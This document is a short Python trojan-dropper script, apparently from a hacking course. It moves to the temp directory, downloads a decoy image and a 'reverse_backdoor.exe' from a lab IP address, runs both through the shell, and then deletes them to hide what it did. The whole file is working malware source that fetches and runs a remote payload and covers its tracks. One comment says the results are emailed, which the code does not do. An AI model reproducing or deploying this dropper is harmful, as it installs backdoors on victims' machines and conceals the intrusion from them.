#!/usr/bin/env python
import requests, subprocess, os, tempfile

def main():
    # finds and moves us to the temp dir to hide file while executing
    temp_dir = tempfile.gettempdir()
    os.chdir(temp_dir)
    # downloads file, executes command, then emails results
    trojan_file = download_file('http://192.168.159.132/home/fourshells/Documents/code/pythonHacking101/malware/trojans/car.jpg')
    subprocess.Popen(trojan_file, shell=True)

    mal_file = download_file('http://192.168.159.132/home/fourshells/Documents/code/pythonHacking101/malware/backdoor/reverse_backdoor.exe')
    subprocess.call(mal_file, shell=True)

    # removes file from system to hide actions
    os.remove(mal_file)
    os.remove(trojan_file)

def download_file(url):
    #downloads file to current directory and returns the name of the file for use later
    get_response = requests.get(url)
    file_name = url.split('/')[-1]
    with open(file_name, "wb") as out_file:
        out_file.write(get_response.content)
    return file_name

def execute_code(command):
    result = subprocess.check_output(command, shell=True)
    return result

if __name__ == '__main__':
    main()